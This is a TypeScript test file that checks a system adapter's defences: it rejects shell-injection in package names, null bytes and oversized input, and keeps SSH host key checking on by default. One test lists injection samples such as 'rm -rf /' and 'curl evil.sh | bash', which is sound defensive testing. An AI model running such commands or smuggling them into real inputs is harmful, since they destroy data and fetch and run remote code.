import { describe, it, expect, beforeEach, vi } from "vitest";
import { SystemAdapter } from "../../src/providers/system/adapter.js";

describe("SystemAdapter security hardening", () => {
  let adapter: SystemAdapter;

  beforeEach(async () => {
    adapter = new SystemAdapter();
    await adapter.connect();
  });

  it("rejects package inputs that contain shell metacharacters", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");

    const maliciousInputs = [
      "nginx; rm -rf /",
      "nginx && curl evil.sh | bash",
      "nginx || whoami",
      "nginx `whoami`",
      "nginx $(whoami)",
    ];

    for (const packages of maliciousInputs) {
      const result = await adapter.execute("install_packages", {
        host: "10.0.0.10",
        packages,
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain("invalid token");
    }

    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects package inputs with null bytes", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");

    const result = await adapter.execute("install_packages", {
      host: "10.0.0.10",
      packages: "nginx\0curl",
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("null bytes");
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("rejects overly long package payloads", async () => {
    const runProcess = vi.spyOn(adapter as any, "runProcess");
    const oversized = "a".repeat(513);

    const result = await adapter.execute("install_packages", {
      host: "10.0.0.10",
      packages: oversized,
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("exceeds 512");
    expect(runProcess).not.toHaveBeenCalled();
  });

  it("accepts normal package names and returns parsed package list", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "ok", stderr: "", exitCode: 0 },
      });

    const result = await adapter.execute("install_packages", {
      host: "10.0.0.10",
      packages: "nginx apache2 curl",
    });

    expect(result.success).toBe(true);
    expect((result.data as { packages_installed: string[] }).packages_installed).toEqual([
      "nginx",
      "apache2",
      "curl",
    ]);
    expect(runProcess).toHaveBeenCalledTimes(1);
  });

  it("enforces SSH host key verification by default", async () => {
    const runProcess = vi
      .spyOn(adapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "ok", stderr: "", exitCode: 0 },
      });

    const result = await adapter.execute("ssh_exec", {
      host: "10.0.0.10",
      command: "echo ok",
    });

    expect(result.success).toBe(true);
    const args = runProcess.mock.calls[0][1] as string[];
    expect(args).toContain("StrictHostKeyChecking=yes");
    expect(args).not.toContain("UserKnownHostsFile=/dev/null");
  });

  it("allows insecure SSH host key mode only when explicitly disabled", async () => {
    const insecureAdapter = new SystemAdapter({ sshStrictHostKeyCheck: false });
    await insecureAdapter.connect();
    const runProcess = vi
      .spyOn(insecureAdapter as any, "runProcess")
      .mockResolvedValue({
        success: true,
        data: { stdout: "ok", stderr: "", exitCode: 0 },
      });

    const result = await insecureAdapter.execute("ssh_exec", {
      host: "10.0.0.10",
      command: "echo ok",
    });

    expect(result.success).toBe(true);
    const args = runProcess.mock.calls[0][1] as string[];
    expect(args).toContain("StrictHostKeyChecking=no");
    expect(args).toContain("UserKnownHostsFile=/dev/null");
  });
});
